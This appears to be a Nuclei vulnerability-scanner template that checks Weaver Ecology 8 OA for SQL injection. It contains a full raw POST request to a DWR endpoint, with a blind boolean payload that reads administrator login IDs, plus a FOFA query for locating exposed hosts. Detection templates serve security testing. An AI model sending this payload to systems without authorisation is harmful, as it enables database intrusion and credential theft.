id: ecology-v8-docdwrutil-sqli

info:
  name: Ecology 8 - SQL Injection
  author: qwtd
  severity: high
  description: Ecology 8 contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
  reference:
    - https://github.com/zan8in/pocwiki/blob/91fce61900acea899135385d32d3321e7e23d368/%E6%9F%90%E5%BE%AE_E-Cology_%E6%9F%90%E7%89%88%E6%9C%AC_SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
  metadata:
    max-request: 1
    fofa-query: app="泛微-协同办公OA"
  tags: 泛微-协同办公OA

http:
  - raw: 
      - |
        POST /dwr/call/plaincall/DocDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
        Content-Length: 191
        Accept-Encoding: gzip
        Connection: close
        Content-Type: text/plain
        
        callCount=1
        page=
        httpSessionId=
        scriptSessionId=
        c0-scriptName=DocDwrUtil
        c0-methodName=ifNewsCheckOutByCurrentUser
        c0-id=0
        c0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115
        c0-param1=string:1
        batchId=0

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "DWR-INSERT"
          - "DWR-REPLY"
        condition: and

      - type: status
        status:
          - 200